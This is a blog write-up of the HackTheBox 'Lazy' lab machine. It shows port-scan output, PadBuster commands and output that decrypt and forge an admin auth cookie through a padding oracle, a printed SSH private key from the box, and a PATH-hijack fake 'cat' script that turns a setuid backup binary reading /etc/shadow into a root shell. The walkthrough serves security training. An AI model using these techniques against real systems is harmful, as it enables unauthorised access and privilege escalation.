---
author:
  name: "0xSc0ut"
date: 2020-07-22
linktitle: HackTheBox-Lazy
title: HackTheBox - Lazy
type:
- post
- posts
weight: 12
series:
- Hugo 101
aliases:
- /blog/HackTheBox-Lazy/
---

![](https://paper-attachments.dropbox.com/s_0D7F007F40F0D6C127E0E610A9E236E2412E24E3D9F3E16A5F441EA21AE79E33_1595487621067_Screenshot+2020-07-23+at+12.30.09+PM.png)


Welcome to another Medium box after a small gap, So Lazy is an linux based machine which will teach you about very unique technique in web application security.Intial shell took some time for me crack, but further escalation to root was a bit guessy.


## Tools:


- PortScan - Masscan and Nmap
- Exploit - [Padbuster](https://tools.kali.org/web-applications/padbuster)


## Initial Recon:

As intial recon start with scanning all open ports. I always use masscan and nmap which saves me some time,

**Masscan:**


    #masscan
    open tcp 22 10.10.10.18 1595053972
    open tcp 80 10.10.10.18 1595054022
    end

**Nmap:**


    # Nmap 7.80 scan initiated Fri Jul 17 23:40:35 2020 as: nmap -p22,80 -A --max-rate=1000 -oN nmap.txt 10.10.10.18
    Nmap scan report for 10.10.10.18
    Host is up (0.23s latency).
    
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   1024 e1:92:1b:48:f8:9b:63:96:d4:e5:7a:40:5f:a4:c8:33 (DSA)
    |   2048 af:a0:0f:26:cd:1a:b5:1f:a7:ec:40:94:ef:3c:81:5f (RSA)
    |   256 11:a3:2f:25:73:67:af:70:18:56:fe:a2:e3:54:81:e8 (ECDSA)
    |_  256 96:81:9c:f4:b7:bc:1a:73:05:ea:ba:41:35:a4:66:b7 (ED25519)
    80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
    |_http-server-header: Apache/2.4.7 (Ubuntu)
    |_http-title: CompanyDev
    | vulners: 
    |   cpe:/a:apache:http_server:2.4.7: 
    |       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679
    |       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312
    |       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715
    |       CVE-2014-0226   6.8     https://vulners.com/cve/CVE-2014-0226
    |       CVE-2017-9788   6.4     https://vulners.com/cve/CVE-2017-9788
    |       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217
    |       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927
    |       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098
    |       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934                                                                                                                                        
    |       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220                                                                                                                                        
    |       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199                                                                                                                                       
    |       CVE-2017-9798   5.0     https://vulners.com/cve/CVE-2017-9798                                                                                                                                        
    |       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710                                                                                                                                       
    |       CVE-2016-8743   5.0     https://vulners.com/cve/CVE-2016-8743                                                                                                                                        
    |       CVE-2016-2161   5.0     https://vulners.com/cve/CVE-2016-2161                                                                                                                                        
    |       CVE-2016-0736   5.0     https://vulners.com/cve/CVE-2016-0736                                                                                                                                        
    |       CVE-2014-3523   5.0     https://vulners.com/cve/CVE-2014-3523                                                                                                                                        
    |       CVE-2014-0231   5.0     https://vulners.com/cve/CVE-2014-0231                                                                                                                                        
    |       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092                                                                                                                                       
    |       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975                                                                                                                                        
    |       CVE-2015-3185   4.3     https://vulners.com/cve/CVE-2015-3185                                                                                                                                        
    |       CVE-2014-8109   4.3     https://vulners.com/cve/CVE-2014-8109                                                                                                                                        
    |       CVE-2014-0118   4.3     https://vulners.com/cve/CVE-2014-0118                                                                                                                                        
    |       CVE-2014-0117   4.3     https://vulners.com/cve/CVE-2014-0117                                                                                                                                        
    |       CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283                                                                                                                                        
    |_      CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.16 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.8 (95%), Linux 4.4 (95%), Linux 3.18 (95%), Linux 4.2 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%)
    No exact OS matches for host (test conditions non-ideal).
    Network Distance: 2 hops
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    TRACEROUTE (using port 80/tcp)
    HOP RTT       ADDRESS
    1   235.50 ms 10.10.14.1
    2   238.13 ms 10.10.10.18
    
    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    # Nmap done at Fri Jul 17 23:41:03 2020 -- 1 IP address (1 host up) scanned in 27.96 seconds


## Login as Admin:

While accessing port 80 gave us something like,


![](https://paper-attachments.dropbox.com/s_0D7F007F40F0D6C127E0E610A9E236E2412E24E3D9F3E16A5F441EA21AE79E33_1595488761267_Screenshot+2020-07-23+at+12.49.13+PM.png)


Lets register ourself and check whats inside there,

![](https://paper-attachments.dropbox.com/s_0D7F007F40F0D6C127E0E610A9E236E2412E24E3D9F3E16A5F441EA21AE79E33_1595488812075_Screenshot+2020-07-23+at+12.50.03+PM.png)


NOTHING!!!

So our next step would be scanning all directories which are available there, but sorry another dead end.

After some time failures i found out something interesting


![](https://paper-attachments.dropbox.com/s_0D7F007F40F0D6C127E0E610A9E236E2412E24E3D9F3E16A5F441EA21AE79E33_1595488989960_Screenshot+2020-07-23+at+12.52.32+PM.png)


Since i m running out of options i have to try every possible way, So without any hesitation i put those keywords in Google

Ahaa!!


![](https://paper-attachments.dropbox.com/s_0D7F007F40F0D6C127E0E610A9E236E2412E24E3D9F3E16A5F441EA21AE79E33_1595489126476_Screenshot+2020-07-23+at+12.55.07+PM.png)


So i knew one thing for sure that we are in right path,

After a small surfing found a very useful article about [Padding Oracle Attack](https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html) and  [Padbuster](https://tools.kali.org/web-applications/padbuster)


    padbuster http://10.10.10.18/login.php E050Yqtgn8a3V%2B%2F%2BR%2FbO6K8idG81xf2L 8 --cookie auth=E050Yqtgn8a3V%2B%2F%2BR%2FbO6K8idG81xf2L --encoding 0


    +-------------------------------------------+
    | PadBuster - v0.3.3                        |
    | Brian Holyfield - Gotham Digital Science  |
    | labs@gdssecurity.com                      |
    +-------------------------------------------+
    
    INFO: The original request returned the following
    [+] Status: 200
    [+] Location: N/A
    [+] Content Length: 1486
    
    INFO: Starting PadBuster Decrypt Mode
    *** Starting Block 1 of 2 ***
    
    INFO: No error string was provided...starting response analysis
    
    *** Response Analysis Complete ***
    
    The following response signatures were returned:
    
    -------------------------------------------------------
    ID#     Freq    Status  Length  Location
    -------------------------------------------------------
    1       1       200     1564    N/A
    2 **    255     200     15      N/A
    -------------------------------------------------------
    
    Enter an ID that matches the error condition
    NOTE: The ID# marked with ** is recommended : 2
    
    Continuing test with selection 2
    
    [+] Success: (76/256) [Byte 8]
    [+] Success: (8/256) [Byte 7]
    [+] Success: (233/256) [Byte 6]
    [+] Success: (110/256) [Byte 5]
    [+] Success: (235/256) [Byte 4]
    [+] Success: (233/256) [Byte 3]
    [+] Success: (198/256) [Byte 2]
    [+] Success: (146/256) [Byte 1]
    
    Block 1 Results:
    [+] Cipher Text (HEX): b757effe47f6cee8
    [+] Intermediate Bytes (HEX): 663d11109614fab5
    [+] Plain Text: user=tes
    
    Use of uninitialized value $plainTextBytes in concatenation (.) or string at /usr/bin/padbuster line 361, <STDIN> line 1.
    *** Starting Block 2 of 2 ***
    
    [+] Success: (20/256) [Byte 8]
    [+] Success: (55/256) [Byte 7]
    [+] Success: (16/256) [Byte 6]
    [+] Success: (186/256) [Byte 5]
    [+] Success: (2/256) [Byte 4]
    [+] Success: (101/256) [Byte 3]
    [+] Success: (203/256) [Byte 2]
    [+] Success: (53/256) [Byte 1]
    
    Block 2 Results:
    [+] Cipher Text (HEX): af22746f35c5fd8b
    [+] Intermediate Bytes (HEX): c3329dfb42f3cbed
    [+] Plain Text: ter
    
    -------------------------------------------------------
    ** Finished ***
    
    [+] Decrypted value (ASCII): user=tester
    
    [+] Decrypted value (HEX): 757365723D7465737465720505050505
    
    [+] Decrypted value (Base64): dXNlcj10ZXN0ZXIFBQUFBQ==
    
    -------------------------------------------------------

The result says that, **user=tester** is being encrypted to resulted string, so its pretty straight forward that we have to create a encrypted phrase with **user=admin**. 


    padbuster http://10.10.10.18/login.php E050Yqtgn8a3V%2B%2F%2BR%2FbO6K8idG81xf2L 8 --cookie auth=E050Yqtgn8a3V%2B%2F%2BR%2FbO6K8idG81xf2L --encoding 0 -plaintext user=admin

Note: Replace with your auth value while using above command.


    +-------------------------------------------+
    | PadBuster - v0.3.3                        |
    | Brian Holyfield - Gotham Digital Science  |
    | labs@gdssecurity.com                      |
    +-------------------------------------------+
    
    INFO: The original request returned the following
    [+] Status: 200
    [+] Location: N/A
    [+] Content Length: 1486
    
    INFO: Starting PadBuster Encrypt Mode
    [+] Number of Blocks: 2
    
    INFO: No error string was provided...starting response analysis
    
    *** Response Analysis Complete ***
    
    The following response signatures were returned:
    
    -------------------------------------------------------
    ID#     Freq    Status  Length  Location
    -------------------------------------------------------
    1       1       200     1564    N/A
    2 **    255     200     15      N/A
    -------------------------------------------------------
    
    Enter an ID that matches the error condition
    NOTE: The ID# marked with ** is recommended : 2
    
    Continuing test with selection 2
    
    [+] Success: (196/256) [Byte 8]
    [+] Success: (148/256) [Byte 7]
    [+] Success: (92/256) [Byte 6]
    [+] Success: (41/256) [Byte 5]
    [+] Success: (218/256) [Byte 4]
    [+] Success: (136/256) [Byte 3]
    [+] Success: (150/256) [Byte 2]
    [+] Success: (190/256) [Byte 1]
    
    Block 2 Results:
    [+] New Cipher Text (HEX): 23037825d5a1683b
    [+] Intermediate Bytes (HEX): 4a6d7e23d3a76e3d
    
    [+] Success: (1/256) [Byte 8]
    [+] Success: (36/256) [Byte 7]
    [+] Success: (180/256) [Byte 6]
    [+] Success: (17/256) [Byte 5]
    [+] Success: (146/256) [Byte 4]
    [+] Success: (50/256) [Byte 3]
    [+] Success: (132/256) [Byte 2]
    [+] Success: (135/256) [Byte 1]
    
    Block 1 Results:
    [+] New Cipher Text (HEX): 0408ad19d62eba93
    [+] Intermediate Bytes (HEX): 717bc86beb4fdefe
    
    -------------------------------------------------------
    ** Finished ***
    
    [+] Encrypted value is: BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA
    -------------------------------------------------------

Lets login with the key which we got,


![](https://paper-attachments.dropbox.com/s_0D7F007F40F0D6C127E0E610A9E236E2412E24E3D9F3E16A5F441EA21AE79E33_1595497270230_Screenshot+2020-07-23+at+3.11.00+PM.png)



## Ssh to User:

While accessing **‘My Key’ ,** we found private key


    -----BEGIN RSA PRIVATE KEY-----
    MIIEpAIBAAKCAQEAqIkk7+JFhRPDbqA0D1ZB4HxS7Nn6GuEruDvTMS1EBZrUMa9r
    upUZr2C4LVqd6+gm4WBDJj/CzAi+g9KxVGNAoT+Exqj0Z2a8Xpz7z42PmvK0Bgkk
    3mwB6xmZBr968w9pznUio1GEf9i134x9g190yNa8XXdQ195cX6ysv1tPt/DXaYVq
    OOheHpZZNZLTwh+aotEX34DnZLv97sdXZQ7km9qXMf7bqAuMop/ozavqz6ylzUHV
    YKFPW3R7UwbEbkH+3GPf9IGOZSx710jTd1JV71t4avC5NNqHxUhZilni39jm/EXi
    o1AC4ZKC1FqA/4YjQs4HtKv1AxwAFu7IYUeQ6QIDAQABAoIBAA79a7ieUnqcoGRF
    gXvfuypBRIrmdFVRs7bGM2mLUiKBe+ATbyyAOHGd06PNDIC//D1Nd4t+XlARcwh8
    g+MylLwCz0dwHZTY0WZE5iy2tZAdiB+FTq8twhnsA+1SuJfHxixjxLnr9TH9z2db
    sootwlBesRBLHXilwWeNDyxR7cw5TauRBeXIzwG+pW8nBQt62/4ph/jNYabWZtji
    jzSgHJIpmTO6OVERffcwK5TW/J5bHAys97OJVEQ7wc3rOVJS4I/PDFcteQKf9Mcb
    +JHc6E2V2NHk00DPZmPEeqH9ylXsWRsirmpbMIZ/HTbnxJXKZJ8408p6Z+n/d8t5
    gyoaRgECgYEA0oiSiVPb++auc5du9714TxLA5gpmaE9aaLNwEh4iLOS+Rtzp9jSp
    b1auElzXPwACjKYpw709cNGV7bV8PPfBmtyNfHLeMTVf/E/jbRUO/000ZNznPnE7
    SztdWk4UWPQx0lcSiShYymc1C/hvcgluKhdAi5m53MiPaNlmtORZ1sECgYEAzO61
    apZQ0U629sx0OKn3YacY7bNQlXjl1bw5Lr0jkCIAGiquhUz2jpN7T+seTVPqHQbm
    sClLuQ0vJEUAIcSUYOUbuqykdCbXSM3DqayNSiOSyk94Dzlh37Ah9xcCowKuBLnD
    gl3dfVsRMNo0xppv4TUmq9//pe952MTf1z+7LCkCgYB2skMTo7DyC3OtfeI1UKBE
    zIju6UwlYR/Syd/UhyKzdt+EKkbJ5ZTlTdRkS+2a+lF1pLUFQ2shcTh7RYffA7wm
    qFQopsZ4reQI562MMYQ8EfYJK7ZAMSzB1J1kLYMxR7PTJ/4uUA4HRzrUHeQPQhvX
    JTbhvfDY9kZMUc2jDN9NwQKBgQCI6VG6jAIiU/xYle9vi94CF6jH5WyI7+RdDwsE
    9sezm4OF983wsKJoTo+rrODpuI5IJjwopO46C1zbVl3oMXUP5wDHjl+wWeKqeQ2n
    ZehfB7UiBEWppiSFVR7b/Tt9vGSWM6Uyi5NWFGk/wghQRw1H4EKdwWECcyNsdts0
    6xcZQQKBgQCB1C4QH0t6a7h5aAo/aZwJ+9JUSqsKat0E7ijmz2trYjsZPahPUsnm
    +H9wn3Pf5kAt072/4N2LNuDzJeVVYiZUsDwGFDLiCbYyBVXgqtaVdHCfXwhWh1EN
    pXoEbtCvgueAQmWpXVxaEiugA1eezU+bMiUmer1Qb/l1U9sNcW9DmA==
    -----END RSA PRIVATE KEY-----

And URL also gave us hint that the name of the user is **mitsos.**



    http://10.10.10.18/mysshkeywithnamemitsos

I thought of cracking secret phrase would be our next challenge but fortunately there is no password required.


![](https://paper-attachments.dropbox.com/s_0D7F007F40F0D6C127E0E610A9E236E2412E24E3D9F3E16A5F441EA21AE79E33_1595497512538_Screenshot+2020-07-23+at+3.14.14+PM.png)



## Privilege Escalation to root:

So once we are into low privilege shell, our next job is to escalate our privilege to root.

As you see there is a executable file called **backup**, while running we got a content like


![](https://paper-attachments.dropbox.com/s_0D7F007F40F0D6C127E0E610A9E236E2412E24E3D9F3E16A5F441EA21AE79E33_1595499000518_Screenshot+2020-07-23+at+3.38.29+PM.png)


By using **strings** command , i found that there is a line 


    cat /etc/shadow

By seeing so i came to an understanding that this file uses ‘cat’ command to display content.

So lets create a executable file named cat with PATH variable pointing to our ‘cat’ file


    #!/bin/sh
    /bin/sh

I have created a file in /tmp folder with above content


![](https://paper-attachments.dropbox.com/s_0D7F007F40F0D6C127E0E610A9E236E2412E24E3D9F3E16A5F441EA21AE79E33_1595499378824_Screenshot+2020-07-23+at+3.37.43+PM.png)


Thank you, Have a nice day !!

